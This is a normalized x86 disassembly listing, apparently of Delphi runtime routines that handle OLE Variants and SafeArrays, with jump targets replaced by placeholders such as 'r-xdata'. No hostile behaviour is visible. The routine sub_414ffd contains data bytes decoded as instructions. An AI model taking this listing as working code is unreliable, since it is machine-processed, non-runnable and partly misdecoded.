and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_403ff8
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_403ff8
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_415bdc
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_403ff8
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4042b0
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_40851c
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_4042b0
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4031a4
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_40295c
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_404208
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414155
lea eax [ ebp - 0x208 ]
call sub_403fa4
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4042b0
sub_4141f8
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_4141cc
test al al
jne r-xdata
mov eax esi
mov edx edi
call sub_403ff8
mov eax esi
mov edx ebx
call sub_412ae0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_414224
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41426d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4047fc
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax ebx
call sub_41427c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414274
lea eax [ ebp - 0x4 ]
call sub_4046b0
retn
sub_41427c
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_4141cc
test al al
jne r-xdata
mov eax esi
mov edx edi
call sub_4046ec
mov eax esi
mov edx ebx
call sub_413208
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4142cc
push ebx
mov bx [ eax ]
cmp bx 0x400c
jne r-xdata
mov [ edx ] bx
test [ edx + 0x1 ] 0x20
setne bl
test bl bl
je r-xdata
mov eax [ eax + 0x8 ]
call sub_4142cc
mov ebx eax
jmp r-xdata
xor eax eax
mov [ ecx ] eax
test [ edx + 0x1 ] 0x40
je r-xdata
mov eax ebx
pop ebx
retn
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
jmp r-xdata
sub_414310
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
mov [ ebp - 0x2 ] cx
mov ebx edx
mov esi eax
test bl 0x1
je r-xdata
call sub_40eef8
cmp ebx 0x7f
jg r-xdata
mov [ ebp - 0x8 ] ebx
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
adc ebx 0x0
mov ax [ ebp - 0x2 ]
call sub_414488
test al al
jne r-xdata
lea eax [ ebp - 0x208 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0x2 ]
push eax
call SafeArrayCreate
mov ebx eax
test ebx ebx
jne r-xdata
inc ebx
lea edx [ ebp - 0x208 ]
mov eax esi
inc ebx
sar ebx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
call sub_40f550
mov ax [ ebp - 0x2 ]
or ax 0x2000
mov edx [ ebp + 0x8 ]
mov [ edx ] ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_40eef8
mov ecx edx
mov esi [ eax ]
mov [ ecx + 0x4 ] esi
mov esi [ eax + 0x4 ]
sub esi [ ecx + 0x4 ]
inc esi
mov [ ecx ] esi
add eax 0x8
add edx 0x8
dec ebx
jne r-xdata
sub_4143b8
push ebx
add esp 0xfffffff8
mov ebx eax
mov ecx esp
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4142cc
test al al
jne r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
mov eax 0x80070057
call sub_40f1a0
sub_4143e0
push ebx
add esp 0xfffffff8
mov ebx eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_4142cc
test al al
je r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
movzx eax [ eax ]
jmp r-xdata
pop ecx
pop edx
pop ebx
retn
sub_414408
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push esi
mov eax ebx
call sub_4143b8
push eax
call SafeArrayGetLBound
call sub_40f1a0
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_41442c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push esi
mov eax ebx
call sub_4143b8
push eax
call SafeArrayGetUBound
call sub_40f1a0
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_414450
push ebx
push ecx
mov ebx eax
push esp
mov eax ebx
call sub_4143b8
push eax
call SafeArrayAccessData
call sub_40f1a0
mov eax [ esp ]
pop edx
pop ebx
retn
sub_4144a8
push ebx
push esi
mov ebx eax
movzx esi bx
and esi 0xffffbfff
mov eax esi
sub eax 0x16
jae r-xdata
mov eax ebx
call sub_4141ac
test al al
jne r-xdata
lea eax [ esi + esi * 2 ]
mov edx [ rw-data ]
cmp [ edx + eax * 4 + 0x1 ] 0x0
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_4144e4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x12 ]
mov eax [ ebp + 0xc ]
call sub_4142cc
test al al
jne r-xdata
mov eax [ ebp - 0x18 ]
movzx eax [ eax ]
cmp eax [ ebp + 0x10 ]
je r-xdata
mov eax 0x80070057
call sub_40f1a0
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4145a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov bx [ ebp - 0x12 ]
and bx 0xfff
movzx ebx bx
cmp ebx 0xc
jne r-xdata
mov eax 0x8002000b
call sub_40f1a0
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SafeArrayGetElement
call sub_40f1a0
mov [ ebp - 0x10 ] bx
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SafeArrayPtrOfIndex
call sub_40f1a0
mov eax [ ebp - 0x1c ]
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_40f878
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
call sub_40f878
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4145ab
lea eax [ ebp - 0x10 ]
call sub_40f550
retn
sub_4145b0
push ebp
mov ebp esp
push ebx
mov ebx ecx
inc ebx
jle r-xdata
push ebx
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_4144e4
lea esp [ esp + ebx * 4 + 0xc ]
pop ebx
pop ebp
retn 0x4
push [ edx + ecx * 4 ]
dec ecx
jns r-xdata
sub_4145d4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x12 ]
mov eax [ ebp + 0x8 ]
call sub_4142cc
test al al
jne r-xdata
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x1a ]
mov eax esi
call sub_4142cc
test al al
jne r-xdata
mov eax 0x80070057
call sub_40f1a0
mov eax [ ebp - 0x18 ]
movzx eax [ eax ]
cmp eax [ ebp + 0x10 ]
je r-xdata
mov ax [ ebp - 0x1a ]
call sub_4144a8
test al al
jne r-xdata
mov bx [ ebp - 0x12 ]
and bx 0xfff
movzx ebx bx
cmp ebx 0xc
jne r-xdata
mov eax 0x8002000b
call sub_40f1a0
cmp [ ebp - 0x1a ] 0x100
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41470c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp ebx 0xc
jne r-xdata
cmp [ ebp - 0x1a ] 0x100
jne r-xdata
mov eax 0x80020005
call sub_40f1a0
mov edx esi
lea eax [ ebp - 0x10 ]
mov ecx ebx
call sub_40fdbc
add ebx 0xfffffff8
sub ebx 0x2
jb r-xdata
mov edx esi
lea eax [ ebp - 0x10 ]
call j_sub_40fb0c
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SafeArrayPtrOfIndex
call sub_40f1a0
mov eax [ ebp - 0x24 ]
mov edx esi
call sub_40f878
jmp r-xdata
mov ax [ ebp - 0x1a ]
call sub_4141ac
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
sub ebx 0x3
jne r-xdata
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SafeArrayPutElement
call sub_40f1a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x10 ]
call sub_40f550
retn
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x24 ] eax
sub_41471c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
js r-xdata
mov ebx [ ebp + 0x8 ]
inc ebx
push ebx
push edx
push eax
call sub_4145d4
lea esp [ esp + ebx * 4 + 0xc ]
pop ebx
pop ebp
retn 0x4
push [ ecx + ebx * 4 ]
dec ebx
jns r-xdata
sub_414744
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi [ ebp + 0x8 ]
mov ebp eax
xor ebx ebx
test ecx ecx
jge r-xdata
xor eax eax
mov al [ edi + 0x1 ]
add edi eax
mov eax [ esi + ebx * 4 ]
mul [ edi + 0x2 ]
mov edi [ edi + 0x6 ]
test edi edi
je r-xdata
mov ebp [ ebp ]
add ebp eax
inc ebx
cmp ebx ecx
jle r-xdata
mov edi [ edi ]
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4147c0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] 0x1
mov ebx eax
mov eax edx
call sub_4147a0
dec eax
test eax eax
jle r-xdata
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] eax
dec [ esp + 0x4 ]
jne r-xdata
mov eax ebx
call sub_4147b8
mov esi eax
mov eax [ ebx ]
call sub_4147b8
mov ebp eax
dec esi
test esi esi
jle r-xdata
test ebx ebx
je r-xdata
mov ebx [ ebx ]
mov edi 0x1
inc edi
dec esi
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov eax [ ebx + edi * 4 ]
call sub_4147b8
cmp ebp eax
je r-xdata
sub_414828
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
call sub_4147a0
mov esi eax
push esi
mov eax ebp
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405208
add esp 0x4
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_4147b8
dec eax
mov edx [ ebp ]
mov [ edx + edi * 4 ] eax
mov ebx [ ebx ]
test ebx ebx
je r-xdata
sub_41487c
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ edi ]
call sub_405054
mov edx eax
test edx edx
jl r-xdata
test bl bl
je r-xdata
inc edx
xor eax eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
call sub_405054
cmp eax 0x0
jl r-xdata
inc eax
dec edx
jne r-xdata
mov bl 0x1
jmp r-xdata
mov edx [ edi ]
cmp [ edx + eax * 4 ] 0x0
je r-xdata
mov ecx [ edi ]
cmp [ ecx + eax * 4 ] 0x0
je r-xdata
mov edx [ edi ]
cmp [ edx + eax * 4 ] 0x0
je r-xdata
mov edx [ edi ]
dec [ edx + eax * 4 ]
jmp r-xdata
mov edx [ esi + eax * 4 ]
mov ecx [ edi ]
mov [ ecx + eax * 4 ] edx
dec eax
mov edx [ edi ]
dec [ edx + eax * 4 ]
jmp r-xdata
sub_4148e8
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi eax
mov eax edx
call sub_4147a0
mov ebp eax
mov eax ebp
add eax eax
push eax
mov eax edi
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405208
add esp 0x4
xor ebx ebx
jmp r-xdata
mov eax ebp
add eax eax
cmp ebx eax
jl r-xdata
mov eax [ edi ]
xor edx edx
mov [ eax + ebx * 4 ] edx
inc ebx
test esi esi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
mov eax esi
call sub_4147b8
dec eax
mov edx [ edi ]
mov [ edx + ebx * 4 ] eax
mov esi [ esi ]
sub_414940
push ebx
mov ebx 0x1
test eax eax
je r-xdata
cmp ebx 0x1
jle r-xdata
cmp [ eax ] 0x11
jne r-xdata
call sub_40ed18
cmp ebx 0xe
je r-xdata
xor edx edx
mov dl [ eax + 0x1 ]
add eax edx
mov ebx [ eax + 0xa ]
cmp ebx 0x48
jne r-xdata
cmp ebx 0xf
je r-xdata
mov ebx 0x100
cmp ebx 0x14
jle r-xdata
mov eax ebx
pop ebx
retn
cmp ebx 0x100
je r-xdata
sub_414988
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414cca
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_405328
lea eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_405328
mov eax [ ebp - 0x4 ]
call sub_40f550
mov ebx esi
mov eax ebx
call sub_414940
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x100
jne r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x18 ] 0x8
jmp r-xdata
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_4148e8
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax edi
call sub_414828
lea ecx [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov eax [ ebp - 0xc ]
call sub_405214
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_405054
mov edx eax
mov cx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_414310
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_40f878
mov eax [ ebp - 0x4 ]
call sub_414450
xor eax eax
push ebp
push sub_414c8f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax edi
call sub_4147c0
test al al
je r-xdata
mov eax ebx
call sub_4147a0
dec eax
jle r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_41487c
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xb
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414cd1
lea eax [ ebp - 0x38 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a58
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x3
call sub_404a58
retn
push esi
mov eax [ ebp - 0x10 ]
call sub_405054
mov ecx eax
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_414744
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414470
retn
cmp eax 0x12
jg r-xdata
je r-xdata
sub eax 0x13
je r-xdata
je r-xdata
lea eax [ ebp - 0x28 ]
mov dx [ ebx ]
neg dx
sbb edx edx
neg edx
call sub_413b28
jmp r-xdata
cmp eax 0xa
ja r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
mov cl 0x4
call sub_413958
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
movzx edx [ ebx ]
mov cl 0x2
call sub_413958
jmp r-xdata
sub eax 0xc
je r-xdata
mov eax [ ebp - 0x10 ]
call sub_405054
push eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_41471c
lea eax [ ebp - 0x28 ]
call sub_40f550
jmp [ eax * 4 + jump_table_414ab8 ]
mov eax [ ebx ]
mov edx [ ebx + 0x4 ]
push edx
push eax
lea eax [ ebp - 0x28 ]
call sub_413a54
jmp r-xdata
sub eax 0xec
je r-xdata
lea eax [ ebp - 0x28 ]
mov edx ebx
call sub_40f878
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
movsx edx [ ebx ]
mov cl 0xfe
call sub_413958
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
mov cl 0xfc
call sub_413958
jmp r-xdata
fld [ ebx ]
lea eax [ ebp - 0x28 ]
call sub_413b50
jmp r-xdata
fld [ ebx ]
lea eax [ ebp - 0x28 ]
call sub_413b50
jmp r-xdata
fild [ ebx ]
lea eax [ ebp - 0x28 ]
call sub_413b78
jmp r-xdata
fld [ ebx ]
lea eax [ ebp - 0x28 ]
call sub_413b50
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
call sub_413c08
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
call sub_413c6c
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
mov cl 0xfc
call sub_413958
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
call sub_413b8c
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
call sub_413c40
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x28 ]
movsx edx [ ebx ]
mov cl 0xff
call sub_413958
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
xor edx edx
mov dl [ ebx ]
mov cl 0x1
call sub_413958
jmp r-xdata
jmp r-xdata
sub_414cd8
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414fd9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_4143e0
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_414450
xor edx edx
push ebp
push sub_414fa9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0xc ]
shl eax 0x2
call sub_4027c4
mov [ ebp - 0x10 ] eax
mov esi [ ebp - 0xc ]
dec esi
test esi esi
jl r-xdata
mov eax 0x80070057
call sub_40f1a0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
mov ebx edi
mov edx ebx
call sub_40507c
mov eax ebx
call sub_4147a0
mov eax ebx
call sub_414940
mov esi eax
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx edi
call sub_414828
lea ecx [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov eax [ ebp - 0x14 ]
call sub_405214
inc esi
xor ebx ebx
cmp eax 0x12
jg r-xdata
je r-xdata
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x8 ]
call sub_41442c
push eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x8 ]
call sub_414408
pop edx
sub edx eax
inc edx
mov eax [ ebp - 0x10 ]
mov [ eax + ebx * 4 ] edx
inc ebx
dec esi
jne r-xdata
sub eax 0x13
je r-xdata
je r-xdata
lea eax [ ebp - 0x28 ]
call sub_411588
mov [ ebx ] ax
jmp r-xdata
cmp eax 0xa
ja r-xdata
lea eax [ ebp - 0x28 ]
call sub_410c44
mov [ ebx ] eax
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
call sub_410180
mov [ ebx ] ax
jmp r-xdata
sub eax 0xc
je r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_41487c
test al al
jne r-xdata
jmp [ eax * 4 + jump_table_414e07 ]
lea eax [ ebp - 0x28 ]
call sub_410c44
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
jmp r-xdata
sub eax 0xec
je r-xdata
mov eax ebx
lea edx [ ebp - 0x28 ]
call sub_40f878
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_405054
mov ecx eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
call sub_4145b0
push edi
mov eax [ ebp - 0x18 ]
call sub_405054
mov ecx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
call sub_414744
mov ebx eax
mov eax esi
cmp eax 0xb
jg r-xdata
mov eax [ ebp - 0x10 ]
call sub_4027e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414fb0
mov eax [ ebp - 0x8 ]
call sub_414470
retn
lea eax [ ebp - 0x28 ]
call sub_410180
mov [ ebx ] ax
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_410180
mov [ ebx ] eax
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_411ad0
fstp [ ebx ]
fwait
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_411ad0
fstp [ ebx ]
fwait
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_41242c
fistp [ ebx ]
fwait
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_411ad0
fstp [ ebx ]
fwait
jmp r-xdata
mov eax ebx
lea edx [ ebp - 0x28 ]
call sub_413208
jmp r-xdata
mov eax ebx
lea edx [ ebp - 0x28 ]
call sub_4138ac
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_410c44
mov [ ebx ] eax
jmp r-xdata
mov eax ebx
lea edx [ ebp - 0x28 ]
call sub_412ae0
jmp r-xdata
mov eax ebx
lea edx [ ebp - 0x28 ]
call sub_4137e0
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x28 ]
call sub_410180
mov [ ebx ] al
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
call sub_410180
mov [ ebx ] al
jmp r-xdata
jmp r-xdata
sub_414fb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414fe0
lea eax [ ebp - 0x28 ]
call sub_40f564
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a58
retn
sub_414ffd
mov eax 0x80040e6
push esi
popad
jb r-xdata
jmp 0xffffffffef2d5072
popad
outsb
je r-xdata
add al 0x0
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_415bdc
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_4154fc
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_41500c
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_41506d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_40504c
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_403254
sub_4150bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_4154fc
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_415bdc
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_415110
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_415148
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_4154fc
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_415184
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov cx [ rw-data ]
xor edx edx
mov eax esi
call sub_4151c8
inc [ rw-data ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_4151c8
push ebp
mov ebp esp
add esp 0xfffffec0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x140 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x8 ] cx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415425
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403224
push rw-data
call EnterCriticalSection
xor ecx ecx
push ebp
push sub_4153f8
push [ fs : ecx ]
mov [ fs : ecx ] esp
movzx ebx [ ebp - 0x8 ]
sub ebx 0x100
test ebx ebx
jl r-xdata
add esp 0xfffffff0
call sub_403578
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
movzx eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
call sub_4039e0
cmp [ ebp - 0x8 ] 0x10f
jae r-xdata
mov eax [ rw-data ]
mov eax [ eax + ebx * 4 ]
test eax eax
je r-xdata
mov eax ebx
mov ecx 0xf
cdq
idiv ecx
inc eax
mov edi eax
shl edi 0x4
sub edi eax
cmp edi 0x7ff
jle r-xdata
mov eax [ rw-data ]
call sub_40504c
mov esi eax
cmp esi ebx
jg r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + ebx * 4 ] edx
mov eax [ ebp - 0x4 ]
mov dx [ ebp - 0x8 ]
mov [ eax + 0x4 ] dx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4153ff
push rw-data
call LeaveCriticalSection
retn
cmp eax [ rw-data ]
jne r-xdata
push edi
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405208
add esp 0x4
mov edx esi
push edx
mov eax [ rw-data ]
call sub_40504c
dec eax
pop edx
sub eax edx
jl r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
mov eax [ rw-data ]
mov eax [ eax ]
